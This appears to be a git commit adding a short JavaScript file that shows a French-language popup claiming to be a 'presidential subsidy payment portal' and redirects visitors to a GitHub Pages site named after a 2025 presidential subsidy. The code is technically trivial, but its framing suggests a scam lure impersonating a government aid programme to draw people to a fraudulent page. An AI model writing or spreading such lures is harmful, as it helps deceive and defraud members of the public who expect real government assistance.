876c72370dbfaf543babc3e58ee5b6d4014034e2
allregnws <promisebassey8081@gmail.com>
2025-05-27 18:05:04 +0100

    Create cg.js

---
+++ cg.js
@@ -0,0 +1,5 @@
+var password = 'Subvention présidentielle'
+password=prompt('POPUP :Bienvenue sur le portail de versement des subventions. Cliquez sur OK pour commencer votre demande. ','Subvention présidentielle');
+if (password != 'Subvention présidentielle') {
+location.href='https://allregnws.github.io/Subvention.Presidentielle.2025.cg';
+}
